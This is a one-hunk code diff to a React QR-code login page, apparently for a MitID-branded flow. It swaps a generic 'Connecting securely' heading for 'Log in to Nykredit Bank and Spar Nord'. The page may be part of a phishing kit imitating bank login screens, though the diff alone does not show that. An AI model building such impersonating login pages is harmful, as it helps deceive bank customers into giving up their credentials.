@@ -233,7 +233,7 @@ export default function QRPage({ sessionId, onBack }: Props) {
             <div className="flex flex-col h-full">
               <div className="flex items-start justify-between mb-2">
                 <h1 className="text-[17px] font-bold text-[#001C44] leading-[1.35] pr-4 whitespace-pre-line">
-                  {titleText || 'Connecting securely'}
+                  {titleText || 'Log in to Nykredit Bank and Spar Nord'}
                 </h1>
                 <MitIdLogo />
               </div>
